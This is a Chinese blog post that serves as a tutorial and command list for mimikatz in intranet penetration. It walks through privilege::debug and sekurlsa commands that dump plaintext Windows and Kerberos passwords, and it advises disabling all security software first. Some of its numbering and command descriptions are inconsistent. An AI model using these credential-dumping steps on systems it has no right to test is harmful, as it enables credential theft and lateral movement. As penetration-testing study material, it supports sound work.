+++
title = "mimikatz"
date = 2026-06-17T09:12:54+08:00
draft = false
description = "内网渗透"
tags = ["内网"]
categories = ["内网"]
series = ["内网"]
pin = false
+++
# 前言

**mimikatz**是一款简单且好用的windows密码抓取神器，该软件可帮助用户一键抓取window密码，操作简单、使用方便。mimikatz 2.1新版能够通过获取的kerberos登录凭据，绕过支持RestrictedAdmin模式的win8或win2012svr的远程终端（RDP）的登陆认证，建议默认禁止RestrictedAdmin模式登录。在使用mimikatz2.1时，请关闭本机所有的安全软件，因为其属于黑客程序，安全软件不退出就无法运行。

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090827439.png)

# mimikatz使用教程

一、获取windows密码的方法很简单，mimikatz2.1版本的只需要三步操作就可以了

1、首先打开mimikatz2.1，该版本分为32位和64位，用户可根据自己计算机的操作系统进行相应选择，若不知道自己的操作系统位数，请鼠标右键点击“计算机”-“属性”，在系统类型中即可知晓。

2、打开之后先输入privilege::debug //提升权限。

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090841213.png)

2、输入sekurlsa::logonpasswords //抓取密码。

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090900571.png)

3、再次输入sekurlsa::wdigest获取kerberos用户信息及Windows密码

![image.png](https://luxury-1393333723.cos.ap-nanjing.myqcloud.com//img/20260617090916488.png)

# 一些命令


一、常规的操作使用命令

1、mimikatz # cls -->清屏，类似dos命令cls

2、mimikatz # exit -->退出mimikatz

3、mimikatz # version -->查看当前的mimikatz的版本

二、系统方面的操作使用命令：system

1、mimikatz  # system ::user -->查看当前登录的系统用户

2、mimikazt # system ::computer -->返回当前的计算机名称

三、在服务器终端的操作命令： ts

1、mimikatz  # ts ::sessions -->显示当前的会话

2、mimikatz # ts ::processes windows-d.vm.nirvana.local -->显示服务器的进程和对应的pid情况等

四、系统服务相关的操作使用命令：service

五、系统进程相关操作的使用命令：process

六、系统线程相关操作使用命令：thread

七、系统句柄相关操作使用命令：handle

八、加密相关操作使用命令：crypto

九、注入操作使用命令：inject

十、其他基础命令

1、cls清屏

2、exit退出

3、version查看mimikatz的版本

4、help查看帮助信息

5、system::user查看当前登录的系统用户

6、system::computer查看计算机名称

7、process::list列出进程

8、process::suspend进程名称-暂停进程

9、process::stop进程名称-结束进程

10、process::modules列出系统的核心模块及所在位置

11、service::list列出系统的服务

12、service::remove移除系统的服务

13、service::start stop服务名称-启动或停止服务

14、privilege::list列出权限列表

15、privilege::enable激活一个或多个权限

16、privilege::debug提升权限

17、nogpo::cmd打开系统的cmd.exe

18、nogpo::regedit打开系统的注册表

19、nogpo::taskmgr打开任务管理器

20、ts::sessions显示当前的会话

21、ts::processes显示进程和对应的pid情况等

22、sekurlsa::wdigest获取本地用户信息及密码

23、sekurlsa::wdigest获取kerberos用户信息及密码

24、sekurlsa::tspkg获取tspkg用户信息及密码

25、sekurlsa::logonPasswords获登陆用户信息及密码